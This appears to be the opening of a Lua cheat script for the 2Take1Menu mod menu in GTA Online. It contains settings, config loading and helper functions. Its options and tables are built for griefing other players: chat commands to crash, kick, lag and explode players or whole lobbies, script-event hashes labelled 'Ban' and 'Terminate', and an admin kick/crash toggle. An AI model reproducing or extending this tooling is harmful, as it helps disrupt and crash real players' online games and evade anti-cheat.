local a = os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\2Take1Script"
local b = {}
local c = {}
b[1] = "version"
c[b[1]] = 11
b[2] = "2t1s_p"
c[b[2]] = true
b[3] = "exclude_fr"
c[b[3]] = true
b[4] = "logger"
c[b[4]] = true
b[5] = "placeholder"
c[b[5]] = nil
b[6] = "placeholder"
c[b[6]] = nil
b[7] = "bl_hidden"
c[b[7]] = false
b[8] = "blacklist_enabled"
c[b[8]] = false
b[9] = "auto_kick"
c[b[9]] = false
b[10] = "mark_modder"
c[b[10]] = false
b[11] = "admin_enabled"
c[b[11]] = false
b[12] = "kick_joining"
c[b[12]] = false
b[13] = "placeholder"
c[b[13]] = nil
b[14] = "modder_hidden"
c[b[14]] = false
b[15] = "remember_modder"
c[b[15]] = false
b[16] = "speed_bypass"
c[b[16]] = false
b[17] = "name_bypass"
c[b[17]] = false
b[18] = "modded_ip_scid"
c[b[18]] = false
b[19] = "modded_net_events"
c[b[19]] = false
b[20] = "modder_force_sh"
c[b[20]] = false
b[21] = "placeholder"
c[b[21]] = nil
b[22] = "lobby_hidden"
c[b[22]] = false
b[23] = "veh_blacklist"
c[b[23]] = false
b[24] = "Oppressor"
c[b[24]] = false
b[25] = "MK2_Oppressor"
c[b[25]] = false
b[26] = "Lazer"
c[b[26]] = false
b[27] = "Hydra"
c[b[27]] = false
b[28] = "Deluxo"
c[b[28]] = false
b[29] = "Akula"
c[b[29]] = false
b[30] = "B_11_Strikforce"
c[b[30]] = false
b[31] = "Tank"
c[b[31]] = false
b[32] = "Khanjali"
c[b[32]] = false
b[33] = "Stromberg"
c[b[33]] = false
b[34] = "Buzzard"
c[b[34]] = false
b[35] = "Hunter"
c[b[35]] = false
b[36] = "Avenger"
c[b[36]] = false
b[37] = "Insurgent_Pickup"
c[b[37]] = false
b[38] = "Insurgent_Pickup_Custom"
c[b[38]] = false
b[39] = "Halftrack"
c[b[39]] = false
b[40] = "placeholder"
c[b[40]] = nil
b[41] = "teleport_to_block"
c[b[41]] = false
b[42] = "explode_lobby"
c[b[42]] = false
b[43] = "explode_lobby_value"
c[b[43]] = 8
b[44] = "explode_lobby_shake"
c[b[44]] = false
b[45] = "sound_rape"
c[b[45]] = false
b[46] = "kill_all_peds"
c[b[46]] = false
b[47] = "disablecontrol"
c[b[47]] = false
b[48] = "bounty_after_death"
c[b[48]] = false
b[49] = "bounty_after_death_value"
c[b[49]] = 0
b[50] = "anonymous_bounty"
c[b[50]] = false
b[51] = "karma_se"
c[b[51]] = false
b[52] = "placeholder"
c[b[52]] = nil
b[53] = "placeholder"
c[b[53]] = nil
b[54] = "punish_aliens"
c[b[54]] = false
b[55] = "placeholder"
c[b[55]] = nil
b[56] = "force_host"
c[b[56]] = false
b[57] = "placeholder"
c[b[57]] = nil
b[58] = "placeholder"
c[b[58]] = nil
b[59] = "chat_hidden"
c[b[59]] = false
b[60] = "chat_cmd_friends"
c[b[60]] = true
b[61] = "chat_cmd_all"
c[b[61]] = false
b[62] = "chat_log"
c[b[62]] = false
b[63] = "chat_russki"
c[b[63]] = false
b[64] = "chat_begger"
c[b[64]] = false
b[65] = "placeholder"
c[b[65]] = nil
b[66] = "chat_cmd"
c[b[66]] = false
b[67] = "cmd_explode"
c[b[67]] = false
b[68] = "cmd_explode_all"
c[b[68]] = false
b[69] = "cmd_kick"
c[b[69]] = false
b[70] = "cmd_kick_all"
c[b[70]] = false
b[71] = "cmd_crash"
c[b[71]] = false
b[72] = "cmd_crash_all"
c[b[72]] = false
b[73] = "cmd_lag"
c[b[73]] = false
b[74] = "cmd_trap"
c[b[74]] = false
b[75] = "cmd_tp"
c[b[75]] = false
b[76] = "cmd_clearwanted"
c[b[76]] = false
b[77] = "cmd_vehicle"
c[b[77]] = false
b[78] = "cmd_bigpp"
c[b[78]] = false
b[79] = "cmd_bigppall"
c[b[79]] = false
b[80] = "placeholder"
c[b[80]] = nil
b[81] = "placeholder"
c[b[81]] = nil
b[82] = "explosive_beam_hidden"
c[b[82]] = false
b[83] = "exp_beam"
c[b[83]] = false
b[84] = "exp_beam_type"
c[b[84]] = 59
b[85] = "exp_beam_type_2"
c[b[85]] = 8
b[86] = "exp_beam_radius"
c[b[86]] = 10
b[87] = "exp_beam_min"
c[b[87]] = 75
b[88] = "exp_beam_max"
c[b[88]] = 225
b[89] = "animal_changer_hidden"
c[b[89]] = false
b[90] = "bl_mdl_change"
c[b[90]] = true
b[91] = "ptfx_hidden"
c[b[91]] = false
b[92] = "sparkling_ass"
c[b[92]] = false
b[93] = "sparkling_tires"
c[b[93]] = false
b[94] = "smoke_area"
c[b[94]] = false
b[95] = "fire_circle"
c[b[95]] = false
b[96] = "fire_fart"
c[b[96]] = 8
b[97] = "fire_ass"
c[b[97]] = false
b[98] = "placeholder"
c[b[98]] = nil
b[99] = "placeholder"
c[b[99]] = nil
b[100] = "misc_hidden"
c[b[100]] = false
b[101] = "load_weapons"
c[b[101]] = false
b[102] = "flamethrower_scale"
c[b[102]] = 1
b[103] = "flamethrower"
c[b[103]] = false
b[104] = "flamethrower_green"
c[b[104]] = false
b[105] = "shoot_entitys"
c[b[105]] = false
b[106] = "Boat"
c[b[106]] = false
b[107] = "Bumper_Car"
c[b[107]] = false
b[108] = "XMAS_Tree"
c[b[108]] = false
b[109] = "Orange_Ball"
c[b[109]] = false
b[110] = "Stone"
c[b[110]] = false
b[111] = "Money_Bag"
c[b[111]] = false
b[112] = "Cash_Pile"
c[b[112]] = false
b[113] = "Trash"
c[b[113]] = false
b[114] = "Roller_Car"
c[b[114]] = false
b[115] = "Cable_Car"
c[b[115]] = false
b[116] = "Big_Dildo"
c[b[116]] = false
b[117] = "delete_gun"
c[b[117]] = false
b[118] = "model_gun"
c[b[118]] = false
b[119] = "model_gun_ext"
c[b[119]] = false
b[120] = "rapid_fire"
c[b[120]] = false
b[121] = "placeholder"
c[b[121]] = nil
b[122] = "veh_lights_speed"
c[b[122]] = 125
b[123] = "random_primary"
c[b[123]] = false
b[124] = "random_secondary"
c[b[124]] = false
b[125] = "random_pearlescent"
c[b[125]] = false
b[126] = "random_neon"
c[b[126]] = false
b[127] = "random_smoke"
c[b[127]] = false
b[128] = "random_xenon"
c[b[128]] = false
b[129] = "rainbow_primary"
c[b[129]] = false
b[130] = "rainbow_secondary"
c[b[130]] = false
b[131] = "rainbow_pearlescent"
c[b[131]] = false
b[132] = "rainbow_neon"
c[b[132]] = false
b[133] = "rainbow_smoke"
c[b[133]] = false
b[134] = "rainbow_xenon"
c[b[134]] = false
b[135] = "synced_random"
c[b[135]] = false
b[136] = "synced_rainbow"
c[b[136]] = false
b[137] = "synced_rainbow_smooth"
c[b[137]] = false
b[138] = "placeholder"
c[b[138]] = nil
b[139] = "black_100"
c[b[139]] = false
b[140] = "fade_black_red"
c[b[140]] = false
b[141] = "placeholder"
c[b[141]] = nil
b[142] = "placeholder"
c[b[142]] = nil
b[143] = "heli"
c[b[143]] = false
b[144] = "heli_i"
c[b[144]] = 100
b[145] = "sel_boost_speed"
c[b[145]] = false
b[146] = "sel_boost_speed_speed"
c[b[146]] = 100
b[147] = "speedometer"
c[b[147]] = false
b[148] = "speedometer_type"
c[b[148]] = 1
b[149] = "veh_no_colision"
c[b[149]] = false
b[150] = "drive_on_ocean"
c[b[150]] = false
b[151] = "drive_this_height"
c[b[151]] = false
b[152] = "weird_ent"
c[b[152]] = false
b[153] = "real_time"
c[b[153]] = false
b[154] = "random_clothes"
c[b[154]] = false
b[155] = "clear_area"
c[b[155]] = false
b[156] = "clear_area_2"
c[b[156]] = false
b[157] = "auto_tp_wp"
c[b[157]] = false
b[158] = "police_outfit"
c[b[158]] = false
b[159] = "placeholder"
c[b[159]] = nil
b[160] = "placeholder"
c[b[160]] = nil
b[161] = "auto_load"
c[b[161]] = false
b[162] = "log_modder_flags"
c[b[162]] = false
b[163] = "placeholder"
c[b[163]] = nil
b[164] = "bodyguards_hidden"
c[b[164]] = false
b[165] = "bodyguards_god"
c[b[165]] = false
b[166] = "bodyguards_health"
c[b[166]] = 5000
b[167] = "bodyguards_equip_weapon"
c[b[167]] = false
b[168] = "bodyguards_formation_type"
c[b[168]] = 0
b[169] = "placeholder"
c[b[169]] = nil
b[170] = "options_hidden"
c[b[170]] = false
b[171] = "custom_vehicles_hidden"
c[b[171]] = false
b[172] = "spawn_in_vehicle"
c[b[172]] = true
b[173] = "use_own_veh"
c[b[173]] = true
b[174] = "set_godmode"
c[b[174]] = false
b[175] = "attach_no_colision"
c[b[175]] = false
b[176] = "continuously_assassins"
c[b[176]] = false
b[177] = "override_notify_color"
c[b[177]] = false
b[178] = "notify_color"
c[b[178]] = 0
b[179] = "enable_aim_prot"
c[b[179]] = false
b[180] = "anonymous_punishment"
c[b[180]] = true
b[181] = "aim_prot_ragdoll"
c[b[181]] = false
b[182] = "aim_prot_fire"
c[b[182]] = false
b[183] = "aim_prot_kill"
c[b[183]] = false
b[184] = "aim_prot_remove_weapon"
c[b[184]] = false
b[185] = "aim_prot_kick"
c[b[185]] = false
b[186] = "enable_hotkeys"
c[b[186]] = false
b[187] = "hotkey_notification"
c[b[187]] = false
local d = {}
local e = {}
d[1] = "leave_session"
e[d[1]] = nil
d[2] = "crash_yourself"
e[d[2]] = nil
d[3] = "print_info_from_entity"
e[d[3]] = nil
d[4] = "send_message_to_dc"
e[d[4]] = nil
d[5] = "drive_this_height"
e[d[5]] = nil
d[6] = "auto_tp_wp"
e[d[6]] = nil
d[7] = "force_host"
e[d[7]] = nil
d[8] = "synced_rainbow"
e[d[8]] = nil
d[9] = "veh_blacklist"
e[d[9]] = nil
d[10] = "laser_beam_explode_waypoint"
e[d[10]] = nil
d[11] = "blacklist_enabled"
e[d[11]] = nil
d[12] = "kick_joining"
e[d[12]] = nil
d[13] = "remember_modder"
e[d[13]] = nil
d[14] = "exclude_fr"
e[d[14]] = nil
d[15] = "chat_cmd"
e[d[15]] = nil
d[16] = "send_msg_to_script_users"
e[d[16]] = nil
d[17] = "teleport_high_in_air"
e[d[17]] = nil
d[18] = "tp_own_veh_to_me"
e[d[18]] = nil
d[19] = "tp_own_veh_to_me_drive"
e[d[19]] = nil
d[20] = "drive_own_veh"
e[d[20]] = nil
d[21] = "tp_to_own_veh"
e[d[21]] = nil
d[22] = "save_config"
e[d[22]] = nil
local function f(g, h, i)
    if h == nil then
        h = 140
    end
    if i == nil then
        i = "2Take1Script"
    end
    if c["override_notify_color"] then
        h = c["notify_color"]
    end
    ui.notify_above_map(g, i, h)
end
local function j(k, h)
    if c["logger"] then
        local l = io.open(a .. "\\2Take1Script.log", "a")
        local g = os.date("*t")
        if g.month < 10 then
            g.month = "0" .. g.month
        end
        if g.day < 10 then
            g.day = "0" .. g.day
        end
        if g.hour < 10 then
            g.hour = "0" .. g.hour
        end
        if g.min < 10 then
            g.min = "0" .. g.min
        end
        if g.sec < 10 then
            g.sec = "0" .. g.sec
        end
        local m =
            "[" ..
            g.year ..
                "-" .. g.month .. "-" .. g.day .. " " .. g.hour .. ":" .. g.min .. ":" .. g.sec .. "] [2Take1Script] "
        if h ~= nil then
            m = m .. h .. " "
        end
        io.output(l)
        io.write(m .. k .. "\n")
        io.close(l)
    end
end
if _2t1s then
    j("2Take1Script already loaded, stopping.")
    f("2Take1Script already loaded, stopping.", 208)
    return
end
local n = {
    {"Severe Weather", {0}},
    {"Half Track", {0, 1}},
    {"Night Shark AAT", {0, 2}},
    {"APC Mission", {0, 3}},
    {"MOC Mission", {0, 4}},
    {"Tampa Mission", {0, 5}},
    {"Opressor Mission 1", {0, 6}},
    {"Opressor Mission 2", {0, 7}}
}
local o = {
    {"Ban", 0xec7e01b9, {0, 1, 5, 0}, 0x96308401, {0, 1, 5, 0}},
    {"Dismiss", 0x96308401, {0, 1, 5}, 0x96308401, {0, 1, 5}},
    {"Terminate", 0x96308401, {1, 1, 6}, 0x96308401, {0, 1, 6, 0}}
}
if utils.dir_exists(a) then
    if utils.file_exists(a .. "\\2Take1ScriptEXT.lua") then
        _2t1sEXT = true
        if require("\\2Take1Script\\2Take1ScriptEXT") then
            j("2Take1ScriptEXT successfully loaded.")
        else
            _2t1sEXT = false
            f("ERROR Loading Script, returning!", 208)
            return
        end
    else
        f("2Take1ScriptEXT.lua not found!\nMake sure you have all important files!", 208)
        return
    end
else
    f("2Take1Script folder not found, creating...", 208)
    if utils.make_dir(a) then
        f(
            "Folder created, still missing files!\nMake sure you placed the files in the folder and reload the script!",
            208
        )
    else
        f("Creating folder failed!\nRedownload the script and make sure you got all files!", 208)
    end
    return
end
if utils.file_exists(os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\2Take1Script-Admin.lua") then
    if not l_a then
        if require("2Take1Script-Admin") then
            j("NO ERROR!")
        end
    end
end
if menu.is_threading_mode(0) then
    f("The Menu is in wrong threading mode. Change it to 'Fiber' in Menu Settings.", 27)
    return
end
local p = {
    {"Boat", -1685705098, false},
    {"Bumper_Car", -77393630, false},
    {"XMAS_Tree", 238789712, false},
    {"Orange_Ball", 148511758, false},
    {"Stone", 2042668880, false},
    {"Money_Bag", 289396019, false},
    {"Cash_Pile", -295781225, false},
    {"Trash", 1919238784, false},
    {"Roller_Car", 1543894721, false},
    {"Cable_Car", -733833763, false},
    {"Big_Dildo", 1333481871, false}
}
local q = {
    {222, 222, 255},
    {2, 21, 255},
    {3, 83, 255},
    {0, 255, 140},
    {94, 255, 1},
    {255, 255, 0},
    {255, 150, 5},
    {255, 62, 0},
    {255, 1, 1},
    {255, 50, 100},
    {255, 5, 190},
    {35, 1, 255},
    {15, 3, 255}
}
local r = _2t1s_ped_assassins
local s = {
    {"Oppressor", 0x34B82784},
    {"MK2_Oppressor", 0x7B54A9D3},
    {"Lazer", 0xB39B0AE6},
    {"Hydra", 0x39D6E83F},
    {"Deluxo", 0x586765FB},
    {"Akula", 0x46699F47},
    {"B_11_Strikforce", 0x64DE07A1},
    {"Tank", 0x2EA68690},
    {"Khanjali", 0xAA6F980A},
    {"Stromberg", 0x34DBA661},
    {"Buzzard", 0x2F03547B},
    {"Hunter", 0xFD707EDE},
    {"Avenger", 0x81BD2ED0},
    {"Insurgent_Pickup", 0x9114EADA},
    {"Insurgent_Pickup_Custom", 0x8D4B7A8A},
    {"Halftrack", 0xFE141DA6}
}
local t = {
    {"cmd_explode", "!explode <playername>"},
    {"cmd_explode_all", "!explodeall	[SU]"},
    {"cmd_kick", "!kick <playername>"},
    {"cmd_kick_all", "!kickall	[SU]"},
    {"cmd_crash", "!crash <playername>	[SU]"},
    {"cmd_crash_all", "!crashall	[SU]"},
    {"cmd_lag", "!lag <playername>"},
    {"cmd_trap", "!trap <playername>"},
    {"cmd_tp", "!tp <playername>	[SU]"},
    {"cmd_clearwanted", "!clearwanted	[NOT SU]"},
    {"cmd_vehicle", "!vehicle <NAME>"},
    {"cmd_bigpp", "!bigpp <playername>"},
    {"cmd_bigppall", "!bigppall	[SU]"}
}
local u = _2t1s_russki_chars
local v = _2t1s_begger_texts
if not utils.file_exists(a .. "\\2Take1Script.png") then
    f("ERROR Loading Script, returning!", 208)
    f("Missing files! Redownload the .zip folder and make sure you have all included files!!!")
    return
end
local w = {}
local x = {
    {
        "Main LSC",
        {
            {3291218330, {-357.45132446289, -134.30920410156, 38.53914642334}, {0, 0, -20}, true, true},
            {false, {-370.4, -104.72, 47}, -110.83449554443}
        }
    },
    {
        "La Mesa LSC",
        {
            {3291218330, {722.9853515625, -1089.2061767578, 23.043445587158}, {0, 0, 0}, true, true},
            {false, {700, -1085, 24}, -100}
        }
    },
    {
        "LSIA LSC",
        {
            {3291218330, {-1145.7882080078, -1991.130859375, 13.163989067078}, {0, 0, 45}, true, true},
            {false, {-1117.1, -1983.3, 23}, 104.5}
        }
    },
    {
        "Desert LSC",
        {
            {3291218330, {1178.552734375, 2646.4377441406, 37.874099731445}, {0, 0, 90}, true, true},
            {false, {1182, 2673.2, 39}, 163.3}
        }
    },
    {
        "Paleto Bay LSC",
        {
            {3291218330, {112.54597473145, 6619.6850585938, 31.604303359985}, {0, 0, -45}, true, true},
            {false, {140.8, 6601.9, 32}, 57}
        }
    },
    {
        "Bennys LSC",
        {
            {3291218330, {-208.5591583252, -1308.7404785156, 31.718006134033}, {0, 0, 90}, true, true},
            {false, {-184.2, -1292.5, 34}, 124.3}
        }
    }
}
local y = {
    {
        "Entrance",
        {
            {3291218330, {924.69201660156, 62.243091583252, 81.21053314209}, {0, 0, 80}, true, true},
            {3291218330, {910.31787109375, 36.022556304932, 80.59684753418}, {0, 0, 25}, true, true},
            {false, {920.8, 80.5, 80}, -177}
        }
    },
    {
        "Garage",
        {
            {3291218330, {932.78601074219, -2.0857257843018, 80.166107177734}, {0, 0, 60}, true, true},
            {false, {940, -21, 80}, 4.9}
        }
    },
    {
        "Roof",
        {
            {3291218330, {964.02569580078, 58.947933197021, 113.34354400635}, {0, 0, -30}, true, true},
            {false, {954.8, 63.34, 114}, -124.2}
        }
    }
}
local z = {
    {
        "Entrance",
        {
            {3291218330, {-81.541351318359, -792.25347900391, 44.622947692871}, {0, 0, 100}, true, true},
            {3291218330, {-70.231819152832, -802.17694091797, 44.230716705322}, {0, 0, 0}, true, true},
            {false, {-55.1, -776.5, 46}, 125.4}
        }
    },
    {
        "Garage",
        {
            {3291218330, {-83.269706726074, -773.02490234375, 39.806701660156}, {0, -35, 105}, true, true},
            {false, {-86.2, -762.2, 44}, -165.7}
        }
    },
    {
        "Roof",
        {
            {3291218330, {-66.390617370605, -813.32702636719, 320.40509033203}, {0, 0, 60}, true, true},
            {3291218330, {-66.451454162598, -822.87298583984, 321.19717407227}, {0, 0, 100}, true, true},
            {3291218330, {-68.104598999023, -818.67510986328, 323.35980224609}, {0, 90, 0}, true, true},
            {false, {-76.6, -817.6, 328}}
        }
    },
    {
        "Arena War",
        {
            {3291218330, {-371.32809448242, -1859.2064208984, 21.246929168701}, {0, 15, -75}, true, true},
            {3291218330, {-396.87942504883, -1869.1518554688, 22.718107223511}, {0, 15, -60}, true, true},
            {false, {-379.6, -1850, 23}, -166.6}
        }
    }
}
local A = io.open(a .. "\\2Take1Script.png", "r")
if A ~= nil then
    local B = 1
    for C in io.lines(a .. "\\2Take1Script.png") do
        if B >= 2 then
            w[#w + 1] = C
        end
        B = B + 1
    end
    io.close(A)
end
local D = _2t1s_se_custom
local E = _2t1s_block_custom
local F = _2t1s_custom_attachments
local G = _2t1s_custom_vehicles
local H = _2t1s_vehicle_lag_area
local I = _2t1s_modded_ips
local J = _2t1s_modded_scids
local K = _2t1s_speedometer_units
local L = _2t1s_bounty_amount
local M = _2t1s_sms_texts
local N = {1057201338, 2238511874, 762327283}
local O = {
    62409944,
    64074298,
    155527062,
    153219155,
    131037988,
    141884823,
    104432921,
    147111499,
    9284553,
    114982881,
    137663665,
    63457,
    137601710,
    138075198,
    123017343,
    130291511,
    137851207,
    137714280,
    127448079,
    137579070,
    134412628,
    133709045,
    64234321,
    131973478,
    103019313,
    103054099,
    104041189,
    110470958,
    119266383,
    119958356,
    121397532,
    121698158,
    123849404,
    121943600,
    129159629,
    18965281,
    216820,
    56778561,
    99453545,
    99453882,
    88435916,
    174875493
}
local P = _2t1s_weapons
local Q = {
    ["bl_objects"] = {},
    ["peds"] = {},
    ["attach_obj"] = {},
    ["asteroids"] = {},
    ["lag_area"] = {},
    ["custom_veh"] = {},
    ["preview_veh"] = {},
    ["temp_veh"] = {},
    ["shooting"] = {},
    ["chat_veh"] = {},
    ["bodyguards"] = {},
    ["bodyguards_veh"] = {}
}
local R = {["parent"] = 0, ["opl_parent"] = 0}
local S = {}
local A = io.open(a .. "\\2Take1Script.ini", "r")
if A ~= nil then
    j("Loading Settings from file...")
    local B = 1
    for C in io.lines(a .. "\\2Take1Script.ini") do
        C = string.gsub(C, b[B] .. "=", "")
        if B == 1 then
            if tonumber(C) ~= c["version"] then
                f("You got an old settings file, unfortunately i cant read it :(\nPlease save settings first.", 130)
                j("Old settings file detected, stopping reading it.")
                break
            end
        else
            if C == "true" then
                c[b[B]] = true
            elseif C == "false" then
                c[b[B]] = false
            elseif C ~= "nil" then
                c[b[B]] = tonumber(C)
            end
        end
        B = B + 1
    end
    io.close(A)
end
local function T()
    local A = io.open(a .. "\\2Take1Hotkeys.ini", "r")
    if A ~= nil then
        local B = 1
        for C in io.lines(a .. "\\2Take1Hotkeys.ini") do
            if B == 1 then
                C = string.gsub(C, "version=", "")
                if tonumber(C) ~= c["version"] then
                    f("You got an old Hotkeys.ini file, unfortunately i cant read it :(\nPlease delete the file!", 130)
                    j("Old Hotkeys.ini file detected, stopping reading it.")
                    break
                end
            elseif B <= #d + 1 then
                C = string.gsub(C, d[B - 1] .. "=", "")
                if C ~= "nil" then
                    e[d[B - 1]] = C
                end
            end
            B = B + 1
        end
        io.close(A)
        j("Readed Hotkeys.")
    end
end
T()
local U = {{0, 0}, {0, 6}, {0, 14}, {0, 34}, {0, 0}, {0, 25}, {0, 0}, {0, 35}, {0, 0}, {0, 0}, {0, 48}}
local V = {{0, 45, 0}, {1, 11, 0}, {2, 4294967295, 0}, {6, 4294967295, -1}, {7, 4294967295, -1}}
local W = {{0, 0}, {0, 0}, {0, 0}, {0, 35}, {0, 0}, {0, 25}, {0, 0}, {0, 58}, {0, 0}, {0, 0}, {0, 55}}
local X = {{0, 46, 0}, {1, 13, 0}, {2, 4294967295, 0}, {6, 4294967295, -1}, {7, 4294967295, -1}}
local Y = {"random_primary", "random_secondary", "random_pearlescent", "random_neon", "random_smoke", "random_xenon"}
local Z = {
    "rainbow_primary",
    "rainbow_secondary",
    "rainbow_pearlescent",
    "rainbow_neon",
    "rainbow_smoke",
    "rainbow_xenon"
}
local _ = {"synced_rainbow", "synced_random", "synced_rainbow_smooth"}
local a0, a1, a2 = 0, false, 0
local a3 = v3()
local a4, a5, a6, a7 = nil, {}, {}, false
local a8, a9 = {}, {}
local aa = {}
local ab = {}
local ac, ad
local ae
local af
local ag = nil
local ah
local aj = {}
local ak, al, am
local an
local ao
local ap, aq
local ar = {}
local as = {}
local at = {}
local au = {
    ["flamethrower"] = nil,
    ["flamethrower_green"] = nil,
    ["alien"] = nil,
    ["fire_circle"] = {},
    ["fire_balls"] = {},
    ["fire_ass"] = nil,
    ["fire_ass_ball"] = nil
}
local av = {
    ["maxspeed"] = nil,
    ["illegalname"] = nil,
    ["moddedip"] = nil,
    ["moddedscid"] = nil,
    ["moddednetevent"] = nil,
    ["force_sh"] = nil
}
local aw = {
    65536,
    131072,
    262144,
    524288,
    1048576,
    2097152,
    4194304,
    8388608,
    16777216,
    33554432,
    67108864,
    134217728,
    268435456
}
j("Loading Modder-Flags...")
for B = 1, #aw do
    if player.get_modder_flag_text(aw[B]) == "Max-Speed-Bypass" then
        av["maxspeed"] = aw[B]
    end
    if player.get_modder_flag_text(aw[B]) == "Illegal-Name" then
        av["illegalname"] = aw[B]
    end
    if player.get_modder_flag_text(aw[B]) == "Modded-IP" then
        av["moddedip"] = aw[B]
    end
    if player.get_modder_flag_text(aw[B]) == "Modded-SCID" then
        av["moddedscid"] = aw[B]
    end
    if player.get_modder_flag_text(aw[B]) == "Modded-Net-Event" then
        av["moddednetevent"] = aw[B]
    end
    if player.get_modder_flag_text(aw[B]) == "Forced-Script-Host" then
        av["force_sh"] = aw[B]
    end
    if player.get_modder_flag_text(aw[B]) == "" then
        break
    end
end
if av["maxspeed"] == nil then
    av["maxspeed"] = player.add_modder_flag("Max-Speed-Bypass")
end
if av["illegalname"] == nil then
    av["illegalname"] = player.add_modder_flag("Illegal-Name")
end
if av["moddedip"] == nil then
    av["moddedip"] = player.add_modder_flag("Modded-IP")
end
if av["moddedscid"] == nil then
    av["moddedscid"] = player.add_modder_flag("Modded-SCID")
end
if av["moddednetevent"] == nil then
    av["moddednetevent"] = player.add_modder_flag("Modded-Net-Event")
end
if av["force_sh"] == nil then
    av["force_sh"] = player.add_modder_flag("Forced-Script-Host")
end
local ax = enable_rockstar_admin_kick_crash
math.randomseed(utils.time_ms())
local function ay()
    local h = debug.getinfo(2, "S")
    local az = h.source:sub(2) or h
    while string.find(az, "\\", 1) ~= nil do
        az = string.sub(az, 2)
    end
    return az
end
local function aA(B)
    if player.is_player_valid(B) then
        return player.get_player_name(B)
    end
    return "Invalid Player"
end
local function aB(B)
    if player.is_player_valid(B) then
        local aC = player.get_player_scid(B)
        if aC ~= 4294967295 then
            return aC
        end
    end
    return -1
end
local function aD(aE, aF, h)
    return menu.add_feature(aE, "parent", aF, h)
end
local function aG(aE, aF, h)
    return menu.add_feature(aE, "action", aF, h)
end
local function aH(aE, aF, h)
    return menu.add_feature(aE, "toggle", aF, h)
end
local function aI(aE, aJ, aF, h)
    return menu.add_feature(aE, aJ, aF, h)
end
local function aK(aE, aF, h)
    return menu.add_player_feature(aE, "parent", aF, h)
end
local function aL(aE, aF, h)
    return menu.add_player_feature(aE, "action", aF, h)
end
local function aM(aE, aF, h)
    return menu.add_player_feature(aE, "toggle", aF, h)
end
local function aN(aE, aJ, aF, h)
    return menu.add_player_feature(aE, aJ, aF, h)
end
local function aO(aP)
    if aP.on then
        return HANDLER_CONTINUE
    end
    return HANDLER_POP
end
local function aQ(aR, g)
    if not network.has_control_of_entity(aR) then
        network.request_control_of_entity(aR)
        if g == nil then
            g = 25
        end
        local time = utils.time_ms() + g
        while not network.has_control_of_entity(aR) and entity.is_an_entity(aR) do
            system.yield(0)
            network.request_control_of_entity(aR)
            if time < utils.time_ms() then
                return false
            end
        end
    end
    return true
end
local function aS(i)
    if i ~= nil and not streaming.has_model_loaded(i) then
        streaming.request_model(i)
        local time = utils.time_ms() + 5000
        while not streaming.has_model_loaded(i) do
            system.yield(0)
            if time < utils.time_ms() then
                return false
            end
        end
    end
    return true
end
local aT = streaming.set_model_as_no_longer_needed
local aU = script.trigger_script_event
local aV = player.player_id
local aW = player.get_player_ped
local function aX()
    return aW(aV())
end
local function aY()
    return player.get_player_heading(aV())
end
local aZ = entity.get_entity_coords
local function a_()
    return aZ(aX())
end
local function b0(B, a)
    aQ(B)
    entity.set_entity_velocity(B, v3())
    entity.set_entity_coords_no_offset(B, a)
end
local function b1(az, time)
    if az ~= nil and az[1] ~= nil then
        j("Starting Clean Up.")
        if time == nil then
            time = 5
        end
        for B = 1, #az do
            if az[B] ~= aX() and az[B] ~= ped.get_vehicle_ped_is_using(aX()) then
                aQ(az[B], time)
                entity.detach_entity(az[B])
                entity.set_entity_velocity(az[B], v3())
                b0(az[B], v3(8000, 8000, -1000))
                entity.delete_entity(az[B])
            end
        end
        j("Done.")
    end
end
event.add_event_listener(
    "exit",
    function()
        j("")
        j("2Take1Script got unloaded.")
        j("Cleaning up...")
        f("2Take1Script got unloaded.\nUnloading Script.. :(", 200)
        for B in pairs(Q) do
            b1(Q[B])
        end
        b1({ap})
        b1({an})
        if au["flamethrower"] ~= nil then
            graphics.remove_particle_fx(au["flamethrower"], true)
        end
        if au["flamethrower_green"] ~= nil then
            graphics.remove_particle_fx(au["flamethrower_green"], true)
        end
        if au["fire_circle"][1] ~= nil then
            for B = 1, #au["fire_circle"] do
                graphics.remove_particle_fx(au["fire_circle"][B], true)
            end
            au["fire_circle"] = {}
            b1(au["fire_balls"])
            au["fire_balls"] = {}
        end
        if au["fire_ass"] ~= nil then
            graphics.remove_particle_fx(au["fire_ass"], true)
        end
        b1({au["fire_ass_ball"]})
        j("Going to remove Chat-Listeners...")
        for B in pairs(ab) do
            event.remove_event_listener("chat", ab[B])
        end
        j("Done.")
        _2t1s = false
        _2t1sEXT = false
    end
)
local function b2(b3, b4)
    local b5, b6, b7 = 0, 0, 0
    if b3.x ~= nil and b4.x ~= nil then
        b5 = (b4.x - b3.x) ^ 2
    end
    if b3.y ~= nil and b4.y ~= nil then
        b6 = (b4.y - b3.y) ^ 2
    end
    if b3.z ~= nil and b4.z ~= nil then
        b7 = (b4.z - b3.z) ^ 2
    end
    return (b5 + b6 + b7) ^ 0.5
end
local function b8(g, b9, i)
    j("Teleporting to Target.")
    local ba, bb, bc, bd = aX()
    if type(g) == "number" then
        bd = ped.get_vehicle_ped_is_using(g)
        if bd ~= 0 then
            if ped.is_ped_in_any_vehicle(ba) then
                ped.clear_ped_tasks_immediately(ba)
                system.yield(10)
            end
        end
    end
    bc = ped.get_vehicle_ped_is_using(ba)
    if bc ~= 0 then
        aQ(bc)
        entity.set_entity_velocity(bc, v3())
        ba = bc
    end
    if type(g) == "number" then
        bb = aZ(g)
    else
        bb = g
    end
    if b9 ~= nil then
        bb.z = bb.z + b9
    end
    b0(ba, bb)
    if i ~= nil then
        entity.set_entity_heading(ba, i)
    end
    if bd ~= nil then
        system.yield(1500)
        ped.set_ped_into_vehicle(aX(), bd, vehicle.get_free_seat(bd))
    end
    j("Done.")
end
local function be(B)
    local bf = script.get_global_i(2424073 + B * 421 + 235 + 1)
    local bg = interior.get_interior_from_entity(aW(B))
    if bf ~= 0 and (bg ~= nil or bg ~= 0) then
        return true
    end
    return false
end
local function bh(B)
    if player.is_player_valid(B) then
        local bi = aB(B)
        if bi ~= -1 and B ~= aV() and not player.is_player_modder(B, -1) then
            if c["exclude_fr"] and not player.is_player_friend(B) or not c["exclude_fr"] then
                return true
            end
        end
    end
    return false
end
local function bj(water, bk)
    if
        not S["bl_mdl_change"].on or
            S["bl_mdl_change"].on and
                (not ped.is_ped_in_any_vehicle(aX()) and
                    (water and entity.is_entity_in_water(aX()) or not water and not entity.is_entity_in_water(aX())) or
                    bk)
     then
        return true
    end
    f("Model Change not possible!", 125)
    return false
end
local function bl(i, water, bm, bn, bk)
    if bj(water, bk) then
        if bn then
            b8(a_(), 1.5)
        end
        aS(i)
        player.set_player_model(i)
